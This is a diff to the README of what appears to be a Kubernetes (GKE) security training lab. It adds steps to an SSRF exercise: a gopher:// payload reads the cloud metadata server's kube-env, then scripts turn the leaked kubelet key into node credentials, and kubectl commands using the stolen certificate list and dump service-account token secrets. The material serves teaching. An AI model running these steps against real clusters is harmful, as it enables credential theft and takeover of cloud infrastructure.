@@ -30,7 +30,10 @@ kubectl get node
 ```
 
 ### Exercise 1: PodSecurityPolicy
+- Apply k8s manifest and run
+- See credentials
 
+- How to block
 
 ### Exercise 2: Workload Identity
 - Apply k8s manifest
@@ -47,7 +50,7 @@ kubectl port-forward deployment/ssrf-server 8080:8080
 - Open Web Preview
 <img src="img/web-preview.png" width="320">
 
-- Input url (testing)
+- Input url (for testing)
 ```
 https://www.google.com
 ```
@@ -64,11 +67,38 @@ gopher://169.254.169.254:80/_GET /computeMetadata/v1/instance/attributes/kube-en
 ```
 It contains "KUBELET_KEY".
 
+- ctrl+A and store all result to `metadata_exploit/metadata.txt` file
+TODO: ADD image
+
+- store
+```bash
+cd metadata_exploit
+
+# Extract necessary data from metadata
+bash extract.sh
+ls -l metadata
+
+# Get node permission
+bash exploit.sh $(cat metadata/nodename)
+
+# Set env vars
+KUBE_OPT="--client-certificate newcert/node.crt --client-key newcert/new.key --certificate-authority metadata/ca.crt --server https://$(cat metadata/api_ip)"
+echo $KUBE_OPT
+
+# Get secretName
+kubectl $KUBE_OPT get pod -o yaml | grep secretName
+        secretName: default-token-8dhcz
+        secretName: default-token-8dhcz
+        secretName: default-token-8dhcz
+
+# Get secret
+kubectl $KUBE_OPT get secret default-token-8dhcz -o yaml
+```
+
 ### (After this training) Clean cluster
 ```bash
 gcloud container clusters delete gke-security-testing --zone us-central1-a --async
 ```
-
 
 ## References
 - [SSRF in Exchange leads to ROOT access in all instances](https://hackerone.com/reports/341876)
